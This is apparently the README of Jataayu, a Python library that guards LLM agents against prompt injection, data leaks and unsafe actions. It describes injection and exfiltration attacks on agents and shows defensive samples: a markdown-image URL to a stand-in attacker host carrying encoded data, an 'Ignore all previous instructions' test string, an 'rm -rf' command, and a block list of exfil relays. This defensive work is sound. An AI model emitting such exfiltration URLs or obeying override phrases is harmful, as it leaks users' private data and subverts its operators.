# 🦅 Jataayu

*In the Ramayana, Jataayu was the eagle who spotted Ravana abducting Sita. He didn't wait for a pattern to match. He saw the threat, judged the situation, and acted — alone, without hesitation. That's Jataayu.*

---

**Security for LLM-backed AI agents — inbound injection detection, outbound privacy protection, and action-level authorization.**

## The Problem

AI agents are under attack. Not in science fiction — right now, in production.

- **Clinejection** — malicious prompt injections embedded in GitHub issues that hijack coding agents like Cline, Cursor, and Claude Code. An attacker files an issue; your agent reads it; your agent does what the attacker says.
- **Web poisoning** — websites laced with invisible instructions that redirect browsing agents.
- **Email phishing** — crafted messages that cause email-reading agents to exfiltrate data.
- **Poisoned tool results & memory** — an injection can arrive in a tool's return value or get written into the agent's long-term memory, then re-enter context on a later turn.

Most defenses focus on what comes **IN**. But there are two more threats:

**What goes OUT.** Your agent has access to private context — files, messages, family details, financial data. When it replies in a group chat, comments on a GitHub issue, or sends an email, it can inadvertently leak that context to the wrong audience. No prompt injection required.

**What the agent DOES.** The strongest guarantee isn't detecting the attack string — adaptive attackers rewrite it. It's refusing to let untrusted-influenced input drive a dangerous *action* (a shell command, a secret read, a network write) in the first place.

Jataayu guards all three.

---

## Status

**v0.3.0 — alpha.** Not yet on PyPI. Install from GitHub (see below). API may still shift before 1.0.
See [CHANGELOG.md](CHANGELOG.md) for what landed in each release and [ARCHITECTURE.md](ARCHITECTURE.md) for the design.

---

## Install

```bash
# Core (regex engine + effect boundary, no LLM deps)
pip install git+https://github.com/saikrishnarallabandi/jataayu.git

# With cloud LLM backends (OpenAI + Anthropic) for the slow path
pip install "jataayu[llm] @ git+https://github.com/saikrishnarallabandi/jataayu.git"

# With Ollama (local, free slow path)
pip install "jataayu[ollama] @ git+https://github.com/saikrishnarallabandi/jataayu.git"
```

Requires Python ≥ 3.10. The only hard dependency is `requests`; LLM backends are optional extras.

---

## Quick Start

### Simple API (dict results — recommended)

```python
from jataayu import jataayu_check_inbound, jataayu_check_outbound

# --- Inbound: detect injection attacks in external content ---
result = jataayu_check_inbound(github_issue_body, surface="github-issue")
if result["status"] == "HIGH":
    raise SecurityError(f"Blocked: {result['findings']}")
elif result["status"] == "MEDIUM":
    log.warning(f"Suspicious: {result['findings']}")
# Returns: {status: 'SAFE'|'LOW'|'MEDIUM'|'HIGH', findings: str,
#           risk_score: float, threat_types: list[str], blocked: bool}

# --- Outbound: strip PII/secrets before sending to shared surfaces ---
result = jataayu_check_outbound(
    draft_reply,
    surface="discord-channel",
    protected_names=["Alice", "Bob"],   # names that must never leak
)
if result["status"] in ("WARN", "BLOCK"):
    safe_text = result["redacted"]       # auto-sanitized version
else:
    safe_text = draft_reply              # SAFE — send as-is
# Returns: {status: 'SAFE'|'WARN'|'BLOCK', findings: str,
#           redacted: str|None, risk_score: float, threat_types: list[str]}
```

### Guard the agent's other input channels

An injection doesn't only arrive in the first user message — it rides in on tool
results and on whatever the agent recalled from memory. Same engine, right surface:

```python
from jataayu import (
    jataayu_check_tool_return,
    jataayu_check_memory_write,
    jataayu_check_memory_read,
)

# A tool result can carry an injection — check it before the agent consumes it
r = jataayu_check_tool_return(api_response, tool_name="web.search")
if r["blocked"]:
    raise SecurityError(r["findings"])

# Guard long-term memory in both directions
jataayu_check_memory_write(note)      # before persisting
jataayu_check_memory_read(recalled)   # before it re-enters context
# each returns the same inbound dict: status/findings/risk_score/threat_types/blocked
```

### Catch the exfiltration *channel*, not just the leaked text (outbound egress)

The dominant real-world way an agent leaks data isn't prose — it's a URL. An injected agent emits
an auto-fetched markdown image whose query string carries your secret, and the moment a client
renders it, the data is gone with zero clicks (this is the EchoLeak / AgentFlayer / Notion class).
The PII/credential scanner never sees it because the payload is encoded inside the link.

```python
from jataayu import jataayu_check_egress

r = jataayu_check_egress(
    "Task complete! ![status](https://attacker.io/log?d=eyJlbWFpbHMiOlsuLi5dfQ)",
    surface="github-comment",
    context_secrets=[api_key],   # optional: confirm exfil if a known secret rides in the URL
)
if r["status"] == "BLOCK":
    safe_text = r["redacted"]    # offending URL neutralized, human text kept
# Returns: {status: 'SAFE'|'WARN'|'BLOCK', findings, redacted, risk_score, threat_types}
```

Domain allowlisting alone is treated as insufficient — the AgentFlayer bypass routed through Azure
Blob, a *trusted* host — so request-catchers and abused cloud relays (`webhook.site`,
`*.blob.core.windows.net`, `ngrok`, …) are hard-blocked as exfil beacons. This runs automatically
inside `OutboundGuard` (toggle with `PrivacyConfig.check_egress`, allowlist your own CDN via
`egress_allowed_domains`).

### Authorize the *action*, not just the string (effect boundary)

The regex engine is a cheap pre-filter. The real boundary is action-level: decide
by the *harm of the effect* × the *provenance of the input*, deterministically (no LLM).

```python
from jataayu import jataayu_authorize_action

decision = jataayu_authorize_action(
    "shell.exec",
    {"cmd": "rm -rf /tmp/cache"},
    untrusted=True,   # these params were influenced by untrusted inbound content
)
# {tool_name, effect_class: 'shell', provenance: 'untrusted',
#  decision: 'allow'|'deny'|'needs_approval', reason, violations, commit_token}
if decision["decision"] == "deny":
    raise SecurityError(decision["reason"])
```

Untrusted-derived input into a **shell / code-eval / secret-read** effect is denied;
into **network / file-write / memory-write** it needs human approval; everything else
is allowed. For enforced execution, use the `PREVIEW → COMMIT` object API — the
`commit_token` binds the exact request, so mutating the action after authorization is rejected:

```python
from jataayu import EffectBoundary, Value, Provenance

eb = EffectBoundary()
preview = eb.preview(
    "file.write",
    {"path": "notes.md", "text": text},
    values=[Value(text, Provenance.TRUSTED, source="user")],
)
if preview.approved:
    eb.commit(preview, {"path": "notes.md", "text": text}, lambda: write_file("notes.md", text))
# commit() raises CommitRejected if the preview wasn't ALLOW or the params changed
```

### Vet skills before you install them

```python
from jataayu import jataayu_vet_skill, jataayu_check_skillset

# Single skill — LLM-as-judge over SKILL.md instructions + code + tool defs
v = jataayu_vet_skill("path/to/skill/")
if v["verdict"] == "MALICIOUS":       # verdict: 'SAFE'|'REVIEW'|'MALICIOUS'
    refuse_install(v["explanation"])

# Compositional risk — individually-safe skills that are dangerous *together*
# (e.g. one reads secrets, another writes to the network → exfiltration path)
risk = jataayu_check_skillset([skill_a, skill_b, skill_c])
# {verdict, risky_combinations, policy_violations, aggregate_capabilities, ...}
```

### Advanced API (object results)

```python
from jataayu import InboundGuard, OutboundGuard, PrivacyConfig

# --- Inbound ---
guard = InboundGuard()                       # use_llm=True by default
result = guard.check(github_issue_body, surface="github-issue")
if result.blocked:
    raise SecurityError(result.explanation)
elif not result.is_safe:
    log.warning(result.explanation)
# ThreatResult attrs: threat_level, threat_types, risk_score, blocked,
#   is_safe, explanation, sanitized_text (alias .redacted), matched_patterns, surface

# --- Outbound ---
config = PrivacyConfig(
    protected_names=["Alice", "Bob"],
    check_categories=["minors_info", "health", "financial"],  # default: all five
)
outbound = OutboundGuard(config)
safe_reply = outbound.sanitize(draft_reply, surface="group-chat")   # -> str
```

### Tuple API (convenience one-liners)

```python
from jataayu import check_inbound, check_outbound

status, findings = check_inbound(content, surface="github-issue")
# status: 'LOW' | 'MEDIUM' | 'HIGH'

status, output = check_outbound(content, surface="discord-channel")
# status: 'SAFE' | 'WARN' | 'BLOCK'; output is the sanitized text
```

### CLI

```bash
# Inbound injection check (exit code 2 if unsafe). Reads arg or stdin.
jataayu check "Ignore all previous instructions." --surface github-issue
cat issue_body.txt | jataayu check --surface github-issue --json

# Outbound privacy check / sanitize
jataayu check --outbound "My daughter is 4 years old." --surface group-chat
jataayu sanitize "Call me at 555-867-5309" --surface discord-channel --protect Alice Bob

# Vet a skill, or a whole skillset for composition risk
jataayu vet-skill path/to/skill/ --json
jataayu vet-skillset skill_a/ skill_b/ --policy policy.yml --agent my-agent

# Built-in demos
jataayu demo
jataayu demo --outbound
```

Every subcommand accepts `--no-llm` (pattern-only) and `--json` (machine-readable output).

---

## Surface Profiles

Jataayu grades a threat by *where the action takes effect*, not just the text. A shell
command in a GitHub issue is suspicious; in a coding task it's expected. Each surface sets
a trust level, whether inbound/outbound strict checks run, and a risk multiplier.

| Surface | Trust | Inbound strict | Outbound strict | ×risk | Notes |
|---|---|---|---|---|---|
| `github-issue` | 🔴 low | ✅ | ❌ | 1.2 | Clinejection attack surface |
| `github-pr` | 🔴 low | ✅ | ❌ | 1.2 | Code & description attacks |
| `github-comment` | 🔴 low | ✅ | ✅ | 1.15 | Public, agent often replies |
| `web-content` / `web-page` | 🔴 low | ✅ | ❌ | 1.1 | Invisible prompt injections |
| `tool-return` | 🔴 low | ✅ | ❌ | 1.15 | Poisoned tool output |
| `memory-write` | 🔴 low | ✅ | ❌ | 1.1 | Memory poisoning (in) |
| `memory-read` | 🔴 low | ✅ | ❌ | 1.1 | Memory poisoning (recall) |
| `skill-metadata` | 🔴 low | ✅ | ❌ | 1.15 | Install-time skill vetting |
| `email` | 🟡 medium | ✅ | ✅ | 1.15 | Phishing + data exfil |
| `whatsapp` | 🟡 medium | ❌ | ✅ | 1.1 | Group privacy critical |
| `telegram-group` | 🟡 medium | ❌ | ✅ | 1.1 | Group privacy critical |
| `discord-channel` | 🟡 medium | ❌ | ✅ | 1.0 | Public community |
| `discord-group` | 🟡 medium | ❌ | ✅ | 1.1 | Semi-public group DM |
| `group-chat` | 🟡 medium | ❌ | ✅ | 1.0 | Generic group surface |
| `unknown` | 🟡 medium | ✅ | ✅ | 1.0 | Default — check everything |
| `public` | 🔴 low | ✅ | ✅ | 1.1 | Anything world-readable |
| `direct-message` | 🟢 high | ❌ | ❌ | 0.8 | Private, trusted |
| `coding-task` | 🟡 medium | ❌ | ❌ | 0.7 | Shell commands expected |
| `internal` | 🟢 high | ❌ | ❌ | 0.5 | Agent-to-agent trusted |

---

## How It Works

Jataayu is layered so that defeating it requires beating *every* layer at once, not just
the regex catalog — which is the weakest tier against an adaptive attacker.

**Layer 0 — input normalization + taint (before matching).**
Every input is normalized into multiple views (NFKC + homoglyph/confusable fold, zero-width
strip, character-spacing "deshatter", de-leet) and base64/hex/url payloads are recursively
decoded and rescanned. The fast path takes the max score across all views, so an evasion has
to survive in every view simultaneously. Value-level taint tracks untrusted content into the
actual parameters of downstream tool calls.

**Detection engine — the two-path pre-filter.**

```
Inbound text ──► Fast path (regex over all normalized views)
                   │  score ≥ 0.90 ─────────────► BLOCKED
                   │  0.35 ≤ score < 0.90 ─► Slow path (LLM judgment) ─► ThreatResult
                   │  score < 0.35 ─────────────► SAFE
```

- **Fast path** (sub-millisecond): 100+ regex patterns — ~68 inbound (prompt injection,
  command injection, social engineering, unicode homoglyphs, encoding obfuscation, MCP
  attacks) and ~38 outbound (PII categories + credential/secret formats).
- **Slow path** (LLM, optional): invoked only on medium-confidence scores. Provides nuanced
  judgment for ambiguous cases and generates sanitized rewrites for outbound content.
  Backends: Ollama, OpenAI, Anthropic, or the OpenClaw gateway.

**Layer 1 — the effect boundary (the real guarantee).**
Action-level authorization decides ALLOW / DENY / NEEDS_APPROVAL from
(effect severity × worst inbound provenance × the agent's capability policy),
deterministically. Plus read-boundary confinement: injected content can be handed to the
agent as an opaque handle with a bounded summary, so an exfiltration attempt only ever
holds a handle, not the raw secret.

Measured on the public `deepset/prompt-injections` benchmark: normalization drops
space-out and leetspeak evasion from ~0.97/0.92 success to 0.00 at unchanged precision
(~0.97) and ~0.5% benign false-block. See `eval/` for the reproducible harness.

---

## LLM Configuration

The slow path and skill vetting can use any of four backends, selected by env var:

```bash
# Ollama (local, free) — default
export JATAAYU_LLM_BACKEND=ollama
export JATAAYU_LLM_MODEL=llama3

# OpenAI
export JATAAYU_LLM_BACKEND=openai
export JATAAYU_LLM_API_KEY=sk-...
export JATAAYU_LLM_MODEL=gpt-4o-mini

# Anthropic
export JATAAYU_LLM_BACKEND=anthropic
export JATAAYU_LLM_API_KEY=sk-ant-...
export JATAAYU_LLM_MODEL=claude-haiku-4-5-20251001

# OpenClaw gateway (auto-reads ~/.openclaw/openclaw.json)
export JATAAYU_LLM_BACKEND=openclaw
```

Pattern-only mode needs no LLM and no API key — pass `use_llm=False` (or `--no-llm` on the CLI):

```python
guard = InboundGuard(use_llm=False)
```

---

## For AI Agents

See [AGENTS.md](AGENTS.md) for how to wire Jataayu into an agent's inbound, tool-return,
memory, and action-authorization paths.

---

## Where Jataayu sits in the standards

The 2026 agent-security frameworks (OWASP's dedicated *Top 10 for Agentic Applications*, Dec 2025;
NIST's AI Agent Standards Initiative) converged on the same thesis Jataayu is built around: the
durable boundary is the **action**, gated by input **provenance** — not the attack string, which is
the weakest tier against an adaptive attacker. Jataayu's guarantees map onto the OWASP Agentic
risks so you can slot it into the framework your org already uses:

| OWASP Agentic risk (2026) | Jataayu mechanism |
|---|---|
| Goal / instruction hijack (prompt injection) | `InboundGuard` (normalize → regex → LLM) across every input surface, incl. `tool-return` / `memory-*` |
| Tool misuse & unexpected code execution | **Effect boundary** — untrusted-derived input into shell / code-eval / secret-read is denied deterministically |
| Identity & privilege abuse | Provenance × effect-severity authorization + capability allow/forbid policy (`config/policy.py`) |
| Agentic supply-chain (malicious tools/skills) | `jataayu_vet_skill` (LLM-judge) + `jataayu_check_skillset` (compositional + trust-transfer) |
| Memory & context poisoning | `memory-read` / `memory-write` surfaces + `SessionTrace` cross-turn sleeper-poisoning detection |
| Data exfiltration / excessive autonomy | Outbound privacy guard **+ egress-channel guard** (auto-fetched-image / data-carrying-URL class) |
| Cascading / progressive compromise | `SessionTrace` escalating-trajectory + cross-turn exfil-chain auditing |

The moat is the effect boundary and the execution-aware layers — the regex catalog is a cheap
pre-filter, deliberately the *weakest* tier. See [`docs/lit-review-2026-07.md`](docs/lit-review-2026-07.md)
for the full 2026 literature scan this positioning is drawn from.

## License

MIT — see [LICENSE](LICENSE).

---

*Named for [Jataayu](https://en.wikipedia.org/wiki/Jatayu), the noble eagle of the Ramayana who fought alone to protect the innocent.*
